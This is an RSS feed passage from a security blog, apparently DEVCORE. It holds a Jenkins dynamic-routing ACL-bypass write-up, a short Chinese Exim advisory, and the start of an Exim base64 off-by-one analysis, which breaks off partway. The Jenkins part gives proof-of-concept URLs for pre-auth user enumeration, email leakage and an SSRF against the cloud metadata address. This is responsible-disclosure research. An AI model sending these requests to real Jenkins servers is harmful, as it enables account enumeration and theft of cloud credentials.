&lt;p&gt;Under this mode, all contents are visible and readable. Such as agent logs and job/node information. For attackers, the best benefit of this mode is the accessibility of a bunch of private source codes! However, the attacker cannot do anything further or execute Groovy scripts!&lt;/p&gt;

&lt;p&gt;Although this is not the default setting, for DevOps, they may still open this option for automations. According to a little survey on &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt;, there are about 12% servers enabled this mode! We will call this mode &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; in the following sections.&lt;/p&gt;

&lt;h3 id=&quot;3-authenticated-mode&quot;&gt;3. Authenticated Mode&lt;/h3&gt;

&lt;p&gt;This is the default mode. Without a valid credential, you canâ€™t see any information! We will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; to call this mode in following sections.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h2&gt;

&lt;p&gt;To explain this vulnerability, we will start with Jenkinsâ€™ &lt;a href=&quot;https://jenkins.io/doc/developer/handling-requests/routing/&quot;&gt;Dynamic Routing&lt;/a&gt;. In order to provide developers more flexibilities, Jenkins uses a naming convention to resolve the URL and invoke the method dynamically. Jenkins first tokenizes all the URL by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;, and begins from &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; as the entry point to match the token one by one. If the token matches (1)public class member or (2)public class method correspond to following naming conventions, Jenkins invokes recursively!&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;()&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(String)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Int)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Long)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(StaplerRequest)&lt;/li&gt;
    &lt;li&gt;getDynamic(String, â€¦)&lt;/li&gt;
    &lt;li&gt;doDynamic(â€¦)&lt;/li&gt;
    &lt;li&gt;do&amp;lt;token&amp;gt;(â€¦)&lt;/li&gt;
    &lt;li&gt;js&amp;lt;token&amp;gt;(â€¦)&lt;/li&gt;
    &lt;li&gt;Class method with @WebMethod annotation&lt;/li&gt;
    &lt;li&gt;Class method with @JavaScriptMethod annotation&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;It looks like Jenkins provides developers a lot of flexibility. However, too much freedom is not always a good thing. There are two problems based on this naming convention!&lt;/p&gt;

&lt;h3 id=&quot;1-everything-is-the-subclass-of-javalangobject&quot;&gt;1. Everything is the Subclass of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.lang.Object&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;In Java, everything is a subclass of &lt;a href=&quot;https://docs.oracle.com/javase/7/docs/api/java/lang/Object.html&quot;&gt;java.lang.Object&lt;/a&gt;. Therefore, all objects must exist the method - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getClass()&lt;/code&gt;, and the name of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; just matches the naming convention rule &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#1&lt;/code&gt;! So the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; can be also invoked during Jenkins dynamic routing!&lt;/p&gt;

&lt;h3 id=&quot;2-whitelist-bypass&quot;&gt;2. Whitelist Bypass&lt;/h3&gt;

&lt;p&gt;As mentioned before, the biggest difference between &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; is, if the flag set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;False&lt;/code&gt;, the entry point will do one more check in &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java#L4682&quot;&gt;jenkins.model.Jenkins#getTarget()&lt;/a&gt;. The check is a white-list based URL prefix check and here is the list:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ALWAYS_READABLE_PATHS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/login&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/logout&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/accessDenied&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/adjuncts/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/error&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/oops&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/signup&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/tcpSlaveAgentListener&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/federatedLoginService/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/securityRealm&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/instance-identity&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That means you are restricted to those entrances, but if you can find a cross reference from the white-list entrance jump to other objects, you can still bypass this URL prefix check! It seems a little bit hard to understand. Letâ€™s give a simple example to demonstrate the dynamic routing:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkin.local/adjuncts/whatever/class/classLoader/resource/index.jsp/content
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The above URL will invoke following methods in sequence!&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAdjuncts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;whatever&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getResource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.jsp&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getContent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This execution chain seems smooth, but sadly, it can not retrieve the result. Therefore, this is not a potential risk, but itâ€™s still a good case to understand the mechanism!&lt;/p&gt;

&lt;p&gt;Once we realize the principle, the remaining part is like solving a maze. &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; is the entry point. Every member in this object can references to a new object, so our work is to chain the object layer by layer till the exit door, that is, the dangerous method invocation!&lt;/p&gt;

&lt;p&gt;By the way, the saddest thing is that this vulnerability cannot invoke the SETTER, otherwise this would definitely be another interesting classLoader manipulation bug just like &lt;a href=&quot;https://cwiki.apache.org/confluence/display/WW/S2-020&quot;&gt;Struts2 RCE&lt;/a&gt; and &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1622&quot;&gt;Spring Framework RCE&lt;/a&gt;!!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;how-to-exploit&quot;&gt;How to Exploit?&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;How to exploit? In brief, the whole thing this bug can achieve is to use cross reference objects to bypass ACL policy. To leverage it, we need to find a proper gadget so that we can invoke the object we prefer in this object-forest more conveniently! Here we choose the gadget:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/securityRealm/user/[username]/descriptorByName/[descriptor_name]/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The gadget will invoke following methods sequencely.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSecurityRealm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getUser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDescriptorByName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;descriptor_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In Jenkins, all configurable objects will extend the type &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/Descriptor.java&quot;&gt;hudson.model.Descriptor&lt;/a&gt;. And, any class who extends the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Descriptor&lt;/code&gt; type is accessible by method &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/DescriptorByNameOwner.java#L51&quot;&gt;hudson.model.DescriptorByNameOwner#getDescriptorByName(String)&lt;/a&gt;. In general, there are totally about 500 class types can be accessed! But due to the architecture of Jenkins. Most developers will check the permission before the dangerous action again. So even we can find a object reference to the &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;, without the permission &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jenkins.RUN_SCRIPTS&lt;/code&gt;, we still canâ€™t do anything :(&lt;/p&gt;

&lt;p&gt;Even so, this vulnerability can still be considered as a stepping stone to bypass the first ACL restriction and to chain other bugs. We will show 3 vulnerability-chains as our case study! (Although we just show 3 cases, there are more than 3! If you are intersted, itâ€™s highly recommended to find others by yourself :P )&lt;/p&gt;

&lt;p&gt;P.S. It should be noted that in the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getUser([username])&lt;/code&gt;, it will invoke &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getOrCreateById(...)&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;create&lt;/code&gt; flag set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;True&lt;/code&gt;. This result to the creation of a temporary user in memory(which will be listed in the user list but canâ€™t sign in). Although itâ€™s harmless, it is still recognized as a security issue in &lt;a href=&quot;https://jenkins.io/security/advisory/2018-10-10/&quot;&gt;SECURITY-1128&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;1-pre-auth-user-information-leakage&quot;&gt;1. Pre-auth User Information Leakage&lt;/h3&gt;

&lt;p&gt;While testing Jenkins, itâ€™s a common scenario that you want to perform a brute-force attack but you donâ€™t know which account you can try(a valid credential can read the source at least so itâ€™s worth to be the first attempt).&lt;/p&gt;

&lt;p&gt;In this situation, this vulnerability is useful!
Due to the lack of permission check on search functionality. By modifying the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keyword&lt;/code&gt; from a to z, an attacker can list all users on Jenkins!&lt;/p&gt;

&lt;h4 id=&quot;poc&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/search/index?q=[keyword]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also, this vulnerability can be also chained with &lt;a href=&quot;https://jenkins.io/security/advisory/2017-10-11/#user-remote-api-disclosed-users-email-addresses&quot;&gt;SECURITY-514&lt;/a&gt; which reported by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ananthapadmanabhan S R&lt;/code&gt; to leak userâ€™s email address! Such as:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/api/xml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;2-chained-with-cve-2018-1000600-to-a-pre-auth-fully-responded-ssrf&quot;&gt;2. Chained with CVE-2018-1000600 to a Pre-auth Fully-responded SSRF&lt;/h3&gt;

&lt;p&gt;The next bug is &lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600&lt;/a&gt;, this bug is reported by &lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;Orange Tsai&lt;/a&gt;(Yes, itâ€™s me :P). About this vulnerability, the official description is:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;CSRF vulnerability and missing permission checks in GitHub Plugin allowed capturing credentials&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It can extract any stored credentials with known credentials ID in Jenkins. But the credentials ID is a random UUID if there is no user-supplied value provided. So it seems impossible to exploit this?(Or if someone know how to obtain credentials ID, please tell me!)&lt;/p&gt;

&lt;p&gt;Although it canâ€™t extract any credentials without known credentials ID, there is still another attack primitive - a fully-response SSRF! We all know how hard it is to exploit a Blind SSRF, so thatâ€™s why a fully-responded SSRF is so valuable!&lt;/p&gt;

&lt;h4 id=&quot;poc-1&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword
?apiUrl=http://169.254.169.254/%23
&amp;amp;login=orange
&amp;amp;password=tsai
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;3-pre-auth-remote-code-execution&quot;&gt;3. Pre-auth Remote Code Execution&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;PLEASE DONâ€™T BULLSHIT, WHERE IS THE RCE!!!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In order to maximize the impact, I also find an &lt;strong&gt;INTERESTING&lt;/strong&gt; remote code execution can be chained with this vulnerability to a well-deserved pre-auth RCE! But itâ€™s still on the responsible disclosure process. Please wait and see the Part 2! (Will be published on February 19th :P)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;todo&quot;&gt;TODO&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Here is my todo list which can make this vulnerability more perfect. If you find any of them please tell me, really appreciate it :P&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Get the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Plugin&lt;/code&gt; object reference under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt;. If this can be done, it can bypass the ACL restriction of &lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002&lt;/a&gt; and &lt;a href=&quot;https://jenkins.io/security/advisory/2018-02-14/#SECURITY-705&quot;&gt;CVE-2018-6356&lt;/a&gt; to a indeed pre-auth arbitrary file reading!&lt;/li&gt;
  &lt;li&gt;Find another gadget to invoke the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getDescriptorByName(String)&lt;/code&gt; under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt;. In order to fix &lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-672&quot;&gt;SECURITY-672&lt;/a&gt;, Jenkins applies a &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java#L1026&quot;&gt;check&lt;/a&gt; on &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java&quot;&gt;hudson.model.User&lt;/a&gt; to ensure the least privilege &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jenkins.READ&lt;/code&gt;. So the original gadget will fail after Jenkins version 2.138.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;acknowledgement&quot;&gt;Acknowledgement&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Thanks Jenkins Security team especially Daniel Beck for the coordination and bug fixing! Here is the brief timeline:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;May 30, 2018 - Report vulnerabilities to Jenkins&lt;/li&gt;
  &lt;li&gt;Jun 15, 2018 - Jenkins patched the bug and assigned CVE-2018-1000600&lt;/li&gt;
  &lt;li&gt;Jul 18, 2018 - Jenkins patched the bug and assigned CVE-2018-1999002&lt;/li&gt;
  &lt;li&gt;Aug 15, 2018 - Jenkins patched the bug and assigned CVE-2018-1999046&lt;/li&gt;
  &lt;li&gt;Dec 05, 2018 - Jenkins patched the bug and assigned CVE-2018-1000861&lt;/li&gt;
  &lt;li&gt;Dec 20, 2018 - Report Groovy vulnerability to Jenkins&lt;/li&gt;
  &lt;li&gt;Jan 08, 2019 - Jenkins patched Groovy vulnerability and assigned CVE-2019-1003000, CVE-2019-1003001 and CVE-2019-1003002&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en/</link>
                <guid>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en</guid>
                <pubDate>Wed, 16 Jan 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Exim ä»»æ„ä»£ç¢¼åŸ·è¡Œæ¼æ´ (CVE-2018-6789)</title>
                <description>&lt;h2 id=&quot;å…§å®¹&quot;&gt;å…§å®¹&lt;/h2&gt;

&lt;p&gt;ä»Šå¹´æˆ‘å€‘å‘ Exim å›å ±äº†ä¸€å€‹ä½æ–¼ base64 è§£ç¢¼å‡½å¼çš„æº¢å‡ºæ¼æ´ï¼Œç·¨è™Ÿç‚º &lt;strong&gt;CVE-2018-6789&lt;/strong&gt;ã€‚æ­¤æ¼æ´å¾ Exim å°ˆæ¡ˆé–‹å§‹æ™‚å³å­˜åœ¨ï¼Œå› æ­¤&lt;strong&gt;å½±éŸ¿ Exim çš„æ‰€æœ‰ç‰ˆæœ¬&lt;/strong&gt;ã€‚&lt;/p&gt;

&lt;p&gt;æ ¹æ“šæˆ‘å€‘çš„ç ”ç©¶ï¼Œæ”»æ“Šè€…å¯åˆ©ç”¨æ­¤æ¼æ´é”æˆ&lt;strong&gt;é ç«¯ä»»æ„ä»£ç¢¼åŸ·è¡Œï¼Œä¸¦ä¸”ä¸éœ€ä»»ä½•èªè­‰&lt;/strong&gt;ï¼Œè‡³å°‘æœ‰ 40 è¬å° Exim ä¼ºæœå™¨å—æ­¤æ¼æ´å½±éŸ¿ä¸¦å­˜åœ¨è¢«æ”»æ“Šçš„é¢¨éšªã€‚æˆ‘å€‘å»ºè­°ç«‹å³å°‡ Exim &lt;strong&gt;å‡ç´šè‡³ 4.90.1 ç‰ˆ&lt;/strong&gt;ä»¥å…é­å—æ”»æ“Šã€‚&lt;/p&gt;

&lt;h2 id=&quot;ç´°ç¯€&quot;&gt;ç´°ç¯€&lt;/h2&gt;

&lt;p&gt;è©³ç´°çš„æŠ€è¡“ç´°ç¯€è«‹åƒé–±æˆ‘å€‘çš„ Advisoryï¼š
&lt;a href=&quot;https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/&quot;&gt;https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/&lt;/a&gt;&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789/</link>
                <guid>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789</guid>
                <pubDate>Tue, 06 Mar 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Exim Off-by-one RCE: Exploiting CVE-2018-6789 with Fully Mitigations Bypassing</title>
                <description>&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
&lt;p&gt;We reported an overflow vulnerability in the base64 decode function of &lt;a href=&quot;https://www.exim.org/&quot;&gt;&lt;strong&gt;Exim&lt;/strong&gt;&lt;/a&gt; on 5 February, 2018, identified as &lt;a href=&quot;https://exim.org/static/doc/security/CVE-2018-6789.txt&quot;&gt;CVE-2018-6789&lt;/a&gt;. This bug exists since the first commit of exim, hence &lt;strong&gt;ALL versions&lt;/strong&gt; are affected. According to our research, it can be leveraged to gain &lt;strong&gt;Pre-auth Remote Code Execution&lt;/strong&gt; and at least 400k servers are at risk. Patched version 4.90.1 is already released and we suggest to upgrade exim immediately.&lt;/p&gt;

&lt;h2 id=&quot;affected&quot;&gt;Affected&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;All Exim versions below 4.90.1&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;one-byte-overflow-in-base64-decoding&quot;&gt;One byte overflow in base64 decoding&lt;/h1&gt;

&lt;h3 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h3&gt;

&lt;p&gt;This is a calculation mistake of decode buffer length in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b64decode&lt;/code&gt; function:
&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/base64.c#L153&quot;&gt;base64.c: 153 b64decode&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;store_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ustrlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// perform decoding&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

